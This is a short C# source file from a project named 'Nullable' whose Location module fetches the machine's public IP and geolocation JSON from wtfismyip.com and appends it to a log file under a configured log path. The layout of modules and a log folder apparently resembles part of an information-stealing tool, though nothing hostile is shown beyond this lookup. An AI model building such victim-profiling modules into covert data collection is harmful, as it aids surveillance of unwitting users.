using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using static System.Net.Mime.MediaTypeNames;

namespace Nullable.Modules.Manager
{
    internal sealed class Location
    {
        public static void Get()
        {
            string Json = new WebClient().DownloadString("https://wtfismyip.com/json");
            File.AppendAllText(Config.LogPath + "\\Location.json", Json);
        }
    }
}
